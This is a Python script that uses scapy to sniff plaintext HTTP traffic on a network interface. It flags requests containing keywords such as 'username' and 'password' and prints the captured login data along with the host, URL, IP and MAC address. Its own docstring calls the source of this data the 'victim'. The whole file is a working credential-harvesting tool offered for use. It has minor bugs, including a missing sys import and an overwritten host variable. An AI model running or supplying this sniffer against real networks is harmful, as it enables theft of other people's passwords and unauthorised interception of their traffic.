import scapy.all as scapy
from scapy.layers import http
from termcolor import colored
from optparse import OptionParser


def arg_func():
    """
        Arguments from command string
    """
    try:
        parser = OptionParser()
        parser.add_option("-i", "--interface", dest="interface", help="Enter your interface network")
        options, _ = parser.parse_args()
        # Check enter all arguments
        if not options.interface:
            parser.error(colored("Enter interface network -i or --interface", "yellow", attrs=['bold']))
            sys.exit()
        else:
            return options.interface
    except Exception:
        print(colored('[-] An error occurred while adding arguments', 'red', attrs=['bold']))


def print_result(host: str, url: str, ip: str, mac: str, load: str):
    """
        Output result getted data from victim
    """
    host_print = f'{colored("Host:", "yellow", attrs=["bold"])} {colored(host.decode("utf-8"), "cyan", attrs=["bold"])}'
    host_print = f'{colored("Url:", "yellow", attrs=["bold"])} {colored(url.decode("utf-8"), "cyan", attrs=["bold"])}'
    print(
        colored(
            f'[+] {host_print}; Url: {url.decode("utf-8")}; IP: {ip}; MAC: {mac}; Authorization Data: {load.decode("utf-8")}', 'cyan', attrs=['bold']
        )
    )


def get_data(packet):
    """
        Outputing need data from request HTTP
    """
    host = packet['HTTP Request'].Host
    path = packet['HTTP Request'].Path
    url = host + path
    ip = packet['IP'].dst
    mac = packet['Ethernet'].dst
    return host, url, ip, mac


def process_sniffed_packet(packet):
    """
        Callback for sniff packets
    """
    if packet.haslayer(http.HTTPRequest):
        host, url, ip, mac = get_data(packet)
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ['username', 'user', 'login', 'password', 'pass', 'confirm']
            for keyword in keywords:
                if keyword.encode() in load:
                    print_result(host, url, ip, mac, load)
                    break

def sniff(interface):
    """
        Sniffed packets
    """
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


interface = arg_func()

sniff(interface)
